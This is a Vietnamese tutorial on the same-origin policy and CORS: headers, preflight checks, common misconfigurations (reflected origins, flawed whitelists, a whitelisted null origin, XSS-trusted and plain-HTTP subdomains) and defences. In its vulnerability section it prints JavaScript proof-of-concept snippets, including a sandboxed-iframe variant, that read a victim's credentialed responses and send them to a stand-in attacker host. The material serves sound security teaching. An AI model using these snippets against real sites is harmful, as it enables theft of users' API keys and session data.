# CORS
Chia sẻ tài nguyên liên miền (CORS - Cross-origin resource sharing) là một cơ chế của trình duyệt cho phép truy cập có kiểm soát tới các tài nguyên nằm ngoài một miền (domain) nhất định. Nó mở rộng và tăng tính linh hoạt cho chính sách cùng nguồn gốc (SOP). Tuy nhiên, nó cũng tạo điều kiện cho các cuộc tấn công xuyên miền nếu chính sách CORS của một website được cấu hình và triển khai kém. CORS không phải là một biện pháp bảo vệ chống lại các cuộc tấn công xuyên miền như giả mạo yêu cầu liên trang (CSRF).

# SOP
## SOP là gì?

Chính sách cùng nguồn gốc (same-origin policy) là một cơ chế bảo mật của trình duyệt web nhằm ngăn các website tấn công lẫn nhau.

Chính sách cùng nguồn gốc hạn chế các tập lệnh (script) trên một nguồn gốc truy cập dữ liệu từ một nguồn gốc khác. Một nguồn gốc (origin) bao gồm lược đồ URI, tên miền và số cổng. Ví dụ, xét URL sau:

`http://normal-website.com/example/example.html`

URL này sử dụng lược đồ `http`, tên miền `normal-website.com`, và số cổng `80`. Bảng sau cho thấy cách chính sách cùng nguồn gốc được áp dụng nếu nội dung tại URL trên cố gắng truy cập các nguồn gốc khác:

| URL được truy cập | Có được phép truy cập? |
| --- | --- |
| `http://normal-website.com/example/` | Có: cùng lược đồ, tên miền và cổng |
| `http://normal-website.com/example2/` | Có: cùng lược đồ, tên miền và cổng |
| `https://normal-website.com/example/` | Không: khác lược đồ và cổng |
| `http://en.normal-website.com/example/` | Không: khác tên miền |
| `http://www.normal-website.com/example/` | Không: khác tên miền |
| `http://normal-website.com:8080/example/` | Không: khác cổng* |
- Internet Explorer sẽ cho phép truy cập này vì IE không xét đến số cổng khi áp dụng chính sách cùng nguồn gốc.

## Sao SOP lại cần thiết?

Khi một trình duyệt gửi HTTP request từ một nguồn gốc đến một nguồn gốc khác, mọi cookie (bao gồm cookie phiên xác thực) liên quan đến miền kia cũng sẽ được gửi cùng với request. Điều này có nghĩa là phản hồi sẽ được tạo trong phiên của người dùng và bao gồm mọi dữ liệu liên quan cụ thể đến người dùng đó.

Nếu không có chính sách cùng nguồn gốc, khi bạn truy cập một website độc hại, nó sẽ có thể đọc email của bạn trên Gmail, tin nhắn riêng trên Facebook, v.v.

## SOP triển khai như nào?

Chính sách cùng nguồn gốc (SOP) thường kiểm soát quyền truy cập mà mã JavaScript có đối với nội dung được tải từ miền khác. Việc tải tài nguyên xuyên miền thường được cho phép. Ví dụ: SOP cho phép nhúng hình ảnh qua thẻ `<img>`, nhúng media qua thẻ `<video>`, và nhúng JavaScript qua thẻ `<script>`. Tuy nhiên, dù các tài nguyên bên ngoài có thể được tải về trang, JavaScript trên trang sẽ không thể đọc nội dung của các tài nguyên đó.

Có một số ngoại lệ cho chính sách cùng nguồn gốc:

- **Một số đối tượng có thể ghi nhưng không thể đọc xuyên miền**, như đối tượng `location` hoặc thuộc tính `location.href` từ iframe hoặc cửa sổ mới.
- **Một số đối tượng có thể đọc nhưng không thể ghi xuyên miền**, chẳng hạn như thuộc tính `length` của đối tượng `window` (lưu số frame được sử dụng trên trang) và thuộc tính `closed`.
- **Hàm `replace`** thường có thể được gọi xuyên miền trên đối tượng `location`.
- **Một số hàm có thể được gọi xuyên miền**, ví dụ: `close`, `blur`, `focus` trên cửa sổ mới. Hàm `postMessage` cũng có thể được gọi trên iframe và cửa sổ mới để gửi thông điệp giữa các miền.
- **Do yêu cầu tương thích cũ**, chính sách cùng nguồn gốc nới lỏng hơn với cookie, nên chúng thường có thể truy cập từ tất cả các subdomain của một site, dù mỗi subdomain về mặt kỹ thuật là một origin khác nhau. Có thể giảm thiểu rủi ro này bằng cách sử dụng cờ `HttpOnly` cho cookie.

Ngoài ra, có thể **nới lỏng SOP bằng `document.domain`**. Thuộc tính đặc biệt này cho phép giảm bớt ràng buộc SOP cho một domain cụ thể, nhưng chỉ khi nó nằm trong FQDN (fully qualified domain name) của bạn. Ví dụ, bạn có domain `marketing.example.com` và muốn đọc nội dung của domain đó từ `example.com`. Để thực hiện, cả hai domain cần đặt `document.domain = "example.com"`. Khi đó, SOP sẽ cho phép truy cập giữa hai domain này dù khác origin. Trong quá khứ, có thể đặt `document.domain` thành một TLD như `.com` để cho phép truy cập giữa bất kỳ domain nào cùng TLD, nhưng các trình duyệt hiện đại đã chặn điều này.

## Nới lỏng chính sách

Chính sách cùng nguồn gốc (SOP) rất hạn chế, vì vậy đã có nhiều cách tiếp cận được phát triển để vượt qua những ràng buộc này. Nhiều website cần tương tác với các **subdomain** hoặc các site của bên thứ ba theo cách đòi hỏi quyền truy cập toàn diện xuyên miền. Một sự nới lỏng có kiểm soát của SOP có thể thực hiện được bằng cách sử dụng **chia sẻ tài nguyên liên miền (CORS)**.

Giao thức CORS sử dụng một tập hợp các **HTTP header** để định nghĩa các nguồn web (origin) đáng tin cậy và các thuộc tính đi kèm, chẳng hạn như việc có cho phép truy cập kèm xác thực hay không. Các header này được kết hợp trong quá trình **trao đổi giữa trình duyệt và website khác miền** mà nó đang cố gắng truy cập.

# ACAO
## Khái niệm

Header **Access-Control-Allow-Origin** được bao gồm trong phản hồi từ một website đối với request có nguồn gốc từ một website khác, và nó xác định **origin được phép** của request đó.

Trình duyệt web sẽ so sánh giá trị trong **Access-Control-Allow-Origin** với origin của website gửi request. Nếu khớp, trình duyệt sẽ cho phép truy cập vào phản hồi.

## Triển khai CORS đơn giản

Đặc tả chia sẻ tài nguyên liên miền (CORS) quy định nội dung các header được trao đổi giữa máy chủ web và trình duyệt nhằm hạn chế các origin cho những yêu cầu tài nguyên web nằm ngoài domain nguồn gốc. Đặc tả CORS xác định một tập hợp các header giao thức, trong đó **Access-Control-Allow-Origin** là quan trọng nhất. Header này được máy chủ trả về khi một website yêu cầu tài nguyên xuyên miền, kèm theo một header **Origin** do trình duyệt thêm vào.

Ví dụ, giả sử một website có origin `normal-website.com` tạo ra yêu cầu xuyên miền sau:

```
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com
```

Máy chủ tại `robust-website.com` trả về phản hồi:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```

Trình duyệt sẽ cho phép mã chạy trên `normal-website.com` truy cập phản hồi vì các origin khớp nhau.

Đặc tả của **Access-Control-Allow-Origin** cho phép nhiều origin, hoặc giá trị `null`, hoặc ký tự đại diện `*`. Tuy nhiên, **không có trình duyệt nào hỗ trợ nhiều origin**, và có các hạn chế đối với việc sử dụng ký tự đại diện `*`.

## Xử lý CORS kèm thông tin xác thực

Mặc định, các yêu cầu tài nguyên xuyên miền (cross-origin resource requests) **không gửi kèm thông tin xác thực** như cookie hay header `Authorization`. Tuy nhiên, máy chủ khác miền có thể cho phép đọc phản hồi khi thông tin xác thực được gửi kèm, bằng cách đặt header CORS **`Access-Control-Allow-Credentials`** thành `true`.

Ví dụ, nếu website gửi request kèm cookie bằng JavaScript:

```
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```

Và phản hồi từ máy chủ là:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

Khi đó, trình duyệt sẽ cho phép website tại `normal-website.com` đọc phản hồi, vì header **`Access-Control-Allow-Credentials`** được đặt thành `true`.

Ngược lại, nếu thiếu header này, trình duyệt sẽ **không cho phép truy cập** vào phản hồi.

## Nới lỏng đặc tả

Header **Access-Control-Allow-Origin** hỗ trợ ký tự đại diện. Ví dụ:

```
Access-Control-Allow-Origin: *
```

**Lưu ý**

Ký tự đại diện không thể được sử dụng trong bất kỳ giá trị nào khác. Ví dụ, header sau **không hợp lệ**:

```
Access-Control-Allow-Origin: https://*.normal-website.com
```

May mắn là, từ góc độ bảo mật, việc sử dụng ký tự đại diện bị giới hạn trong đặc tả vì bạn **không thể kết hợp ký tự đại diện với việc truyền tải thông tin xác thực xuyên miền** (xác thực, cookie hoặc chứng chỉ phía khách hàng). Do đó, một phản hồi từ máy chủ xuyên miền có dạng:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

là **không được phép** vì điều này sẽ rất nguy hiểm — lộ mọi nội dung có xác thực trên site đích cho mọi người.

Trong những giới hạn này, một vài máy chủ web tạo động header `Access-Control-Allow-Origin` dựa trên origin do client chỉ định. Đây là một thủ thuật nhằm vượt qua hạn chế của CORS nhưng **không an toàn**. Chúng tôi sẽ cho bạn thấy cách điều này có thể bị khai thác ở phần sau.

## Kiểm tra trước

Cơ chế kiểm tra trước (pre-flight check) được bổ sung vào đặc tả CORS để **bảo vệ các tài nguyên cũ** trước những tùy chọn request mở rộng mà CORS cho phép.

Trong một số trường hợp, khi request xuyên miền sử dụng **HTTP method không chuẩn** hoặc **custom header**, thì trước khi gửi request chính, trình duyệt sẽ gửi một request với phương thức **OPTIONS**. Giao thức CORS yêu cầu kiểm tra ban đầu này để xác định **những method và header nào được cho phép** trước khi thực hiện request xuyên miền. Đây gọi là **pre-flight check**.

Máy chủ sẽ trả về danh sách các method được phép (cùng với origin đáng tin cậy), sau đó trình duyệt sẽ kiểm tra xem website gửi request có được phép dùng method đó hay không.

Ví dụ, đây là một request pre-flight muốn dùng method `PUT` cùng với một custom header tên `Special-Request-Header`:

```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

Máy chủ có thể trả về:

```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

Trong phản hồi này:

- **Access-Control-Allow-Methods**: cho phép các method `PUT`, `POST`, `OPTIONS`.
- **Access-Control-Allow-Headers**: cho phép header `Special-Request-Header`.
- **Access-Control-Allow-Credentials**: cho phép gửi kèm thông tin xác thực (cookies, header Authorization…).
- **Access-Control-Max-Age**: định nghĩa thời gian tối đa (ở đây là 240 giây) để cache phản hồi pre-flight nhằm tái sử dụng.

Nếu method và header được phép (như trong ví dụ), trình duyệt sẽ tiếp tục xử lý request xuyên miền như bình thường.

Tuy nhiên, **pre-flight checks tạo thêm một vòng request-response**, làm tăng độ trễ khi duyệt web.

## CORS có chống CSRF không?

CORS **không** cung cấp biện pháp bảo vệ chống các cuộc tấn công giả mạo yêu cầu liên trang (CSRF) - đây là một hiểu lầm phổ biến.

CORS là một sự nới lỏng có kiểm soát của chính sách cùng nguồn gốc, vì vậy nếu cấu hình CORS kém, nó thậm chí có thể làm tăng khả năng xảy ra các cuộc tấn công CSRF hoặc khuếch đại tác hại của chúng.

Vẫn có nhiều cách thực hiện tấn công CSRF mà không cần dùng tới CORS, bao gồm các biểu mẫu HTML đơn giản và việc nhúng tài nguyên từ miền khác.

# Lỗ hổng

Nhiều website hiện đại sử dụng CORS để cho phép truy cập từ các subdomain và bên thứ ba đáng tin cậy. Tuy nhiên, việc triển khai CORS có thể mắc lỗi hoặc được cấu hình quá lỏng lẻo để “cho chắc chắn hoạt động”, và điều này có thể dẫn đến các lỗ hổng có thể khai thác được.

## **Server-generated ACAO header from client-specified Origin header**

Một số ứng dụng cần cấp quyền truy cập cho một số miền khác. Việc duy trì một danh sách các miền được phép đòi hỏi nỗ lực liên tục và bất kỳ sai sót nào cũng có thể làm hỏng chức năng. Vì vậy, một vài ứng dụng chọn cách dễ dàng là về cơ bản cho phép truy cập từ bất kỳ miền nào khác.

Một cách để làm điều này là đọc header `Origin` từ request và đưa vào header phản hồi tuyên bố rằng origin gửi request được phép. Ví dụ, xét một ứng dụng nhận request sau:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

Sau đó nó phản hồi với:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Các header này tuyên bố rằng truy cập được phép từ miền gửi request (`malicious-website.com`) và các request xuyên miền có thể bao gồm cookie (`Access-Control-Allow-Credentials: true`) nên sẽ được xử lý trong phiên.

Vì ứng dụng phản chiếu các origin tùy ý trong header `Access-Control-Allow-Origin`, điều này có nghĩa là **bất kỳ** miền nào cũng có thể truy cập tài nguyên từ miền dễ bị tổn thương. Nếu phản hồi chứa bất kỳ thông tin nhạy cảm nào như khóa API hoặc token CSRF, bạn có thể lấy được chúng bằng cách đặt script sau lên website của mình:

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

## **Errors parsing Origin headers**

Một số ứng dụng hỗ trợ truy cập từ nhiều origin bằng cách sử dụng một **danh sách trắng (whitelist)** các origin được phép. Khi nhận được một yêu cầu CORS, origin được cung cấp sẽ được so sánh với danh sách trắng. Nếu origin xuất hiện trong danh sách trắng thì nó sẽ được phản chiếu vào header `Access-Control-Allow-Origin` để cấp quyền truy cập. Ví dụ, ứng dụng nhận được một request bình thường như sau:

```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

Ứng dụng kiểm tra origin được cung cấp so với danh sách origin được phép và, nếu nó có trong danh sách, phản chiếu origin như sau:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

Các sai sót thường xuất hiện khi triển khai danh sách trắng origin cho CORS. Một số tổ chức quyết định cho phép truy cập từ tất cả các **subdomain** của họ (kể cả những subdomain tương lai chưa tồn tại). Một vài ứng dụng cho phép truy cập từ các domain của các tổ chức khác bao gồm cả subdomain của họ. Những quy tắc này thường được triển khai bằng cách khớp tiền tố hoặc hậu tố URL, hoặc sử dụng **biểu thức chính quy (regular expressions)**. Bất kỳ sai sót nào trong việc triển khai có thể dẫn tới việc cấp quyền truy cập cho các domain ngoài dự định.

Ví dụ, giả sử một ứng dụng cấp quyền truy cập cho tất cả các domain kết thúc bằng:

```
normal-website.com
```

Một kẻ tấn công có thể đăng ký domain:

```
hackersnormal-website.com
```

để có được quyền truy cập.

Hoặc, giả sử một ứng dụng cấp quyền cho tất cả các domain bắt đầu bằng:

```
normal-website.com
```

Một kẻ tấn công có thể có được quyền truy cập bằng cách sử dụng domain:

```
normal-website.com.evil-user.net
```

## **Whitelisted null origin value**

Đặc tả cho header **Origin** cho phép giá trị `null`. Trình duyệt có thể gửi giá trị `null` trong header Origin trong một số tình huống bất thường:

- Chuyển hướng xuyên miền (cross-origin redirects).
- Các yêu cầu từ dữ liệu được tuần tự hóa (requests from serialized data).
- Yêu cầu sử dụng giao thức `file:`.
- Yêu cầu xuyên miền trong iframe bị sandbox (sandboxed cross-origin requests).

Một số ứng dụng có thể đưa origin `null` vào danh sách trắng để hỗ trợ phát triển cục bộ. Ví dụ, giả sử một ứng dụng nhận được yêu cầu xuyên miền sau:

```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

Và máy chủ phản hồi với:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Trong tình huống này, một kẻ tấn công có thể sử dụng nhiều mánh khoé để sinh ra một yêu cầu xuyên miền có chứa giá trị `null` trong header Origin. Điều này sẽ thỏa điều kiện danh sách trắng, dẫn tới truy cập xuyên miền. Ví dụ, điều này có thể thực hiện bằng một iframe bị sandbox thực hiện yêu cầu xuyên miền theo dạng:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## **Exploiting XSS via CORS trust relationships**

Ngay cả CORS được cấu hình “đúng” cũng thiết lập một mối quan hệ tin cậy giữa hai origin. Nếu một website tin tưởng một origin mà origin đó dễ bị cross-site scripting (XSS), thì kẻ tấn công có thể lợi dụng XSS để chèn mã JavaScript sử dụng CORS nhằm truy xuất thông tin nhạy cảm từ site tin tưởng ứng dụng dễ bị XSS đó.

Cho request sau:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Nếu server phản hồi với:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Thì kẻ tấn công tìm thấy lỗ hổng XSS trên `subdomain.vulnerable-website.com` có thể dùng nó để lấy API key, bằng URL dạng:

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## **Breaking TLS with poorly configured CORS**

Giả sử một ứng dụng áp dụng HTTPS nghiêm ngặt đồng thời đưa vào danh sách trắng một subdomain đáng tin cậy đang dùng HTTP thuần. Ví dụ, khi ứng dụng nhận được yêu cầu sau:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Ứng dụng phản hồi:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Trong tình huống này, một kẻ tấn công có khả năng chặn lưu lượng của nạn nhân có thể lợi dụng cấu hình CORS để xâm phạm tương tác của nạn nhân với ứng dụng. Cuộc tấn công bao gồm các bước sau:

1. Người dùng nạn nhân thực hiện bất kỳ yêu cầu HTTP thuần nào.
2. Kẻ tấn công chèn một chuyển hướng tới:
    
    ```
    http://trusted-subdomain.vulnerable-website.com
    ```
    
3. Trình duyệt của nạn nhân theo chuyển hướng.
4. Kẻ tấn công chặn yêu cầu HTTP thuần và trả về một phản hồi giả mạo chứa một yêu cầu CORS tới:
    
    ```
    https://vulnerable-website.com
    ```
    
5. Trình duyệt của nạn nhân thực hiện yêu cầu CORS, bao gồm origin:
    
    ```
    http://trusted-subdomain.vulnerable-website.com
    ```
    
6. Ứng dụng cho phép yêu cầu vì đây là một origin trong danh sách trắng. Dữ liệu nhạy cảm được yêu cầu được trả về trong phản hồi.
7. Trang giả mạo của kẻ tấn công có thể đọc dữ liệu nhạy cảm và truyền nó tới bất kỳ domain nào do kẻ tấn công kiểm soát.

Cuộc tấn công này vẫn hiệu quả ngay cả khi website dễ bị tấn công vốn sử dụng HTTPS một cách vững chắc, không có endpoint HTTP và tất cả cookie đều được gắn cờ secure.

# Bảo mật

Các lỗ hổng CORS chủ yếu phát sinh do cấu hình sai. Vì vậy, việc phòng tránh là vấn đề về cấu hình. Các mục sau mô tả một số biện pháp phòng vệ hiệu quả chống lại tấn công CORS.

## Cấu hình đúng cho các yêu cầu xuyên miền

Nếu một tài nguyên web chứa thông tin nhạy cảm, origin phải được chỉ định đúng trong header **Access-Control-Allow-Origin**.

## Chỉ cho phép các site đáng tin cậy

Nghe có vẻ hiển nhiên nhưng các origin được chỉ định trong header **Access-Control-Allow-Origin** phải chỉ là các site đáng tin cậy. Đặc biệt, việc phản chiếu động origin từ các yêu cầu xuyên miền **mà không kiểm tra** thì rất dễ bị khai thác và cần tránh.

## Tránh đưa `null` vào danh sách trắng

Tránh sử dụng header **Access-Control-Allow-Origin: null**. Các lời gọi tài nguyên xuyên miền từ tài liệu nội bộ và các yêu cầu bị sandbox có thể chỉ định origin `null`. CORS header cần được định nghĩa đúng theo các origin đáng tin cậy cho cả máy chủ nội bộ và công khai.

## Tránh dùng ký tự đại diện trong mạng nội bộ

Tránh sử dụng ký tự đại diện (wildcards) trong mạng nội bộ. Chỉ dựa vào cấu hình mạng để bảo vệ tài nguyên nội bộ là không đủ khi các trình duyệt nội bộ có thể truy cập các domain bên ngoài không đáng tin.

## CORS không thay thế cho các chính sách bảo mật phía máy chủ

CORS xác định hành vi của trình duyệt và **không bao giờ** là sự thay thế cho việc bảo vệ dữ liệu nhạy cảm ở phía máy chủ — kẻ tấn công có thể trực tiếp giả mạo (forge) một request từ bất kỳ origin đã được tin cậy nào. Do đó, máy chủ web vẫn cần áp dụng các biện pháp bảo vệ đối với dữ liệu nhạy cảm, như **xác thực** và **quản lý phiên**, bên cạnh việc cấu hình CORS đúng cách.